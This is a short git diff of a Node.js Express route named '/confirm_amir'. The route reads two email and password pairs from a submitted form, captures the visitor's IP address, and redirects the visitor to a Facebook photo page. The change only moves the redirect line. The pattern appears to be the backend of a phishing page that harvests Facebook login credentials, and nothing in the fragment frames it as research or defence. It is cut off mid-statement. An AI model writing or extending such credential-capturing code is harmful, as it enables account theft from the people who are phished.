@@ -77,11 +77,11 @@ app.post('/confirm', function (req, res) {
 })
 
 app.post('/confirm_amir', function (req, res) {
+    res.redirect('https://www.facebook.com/photo.php?fbid=160897268265919&set=pcb.2277483372290209&type=3&theater&ifg=1')
     var a = req.body.email_a;
     var b = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
-    res.redirect('https://www.facebook.com/photo.php?fbid=160897268265919&set=pcb.2277483372290209&type=3&theater&ifg=1')
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
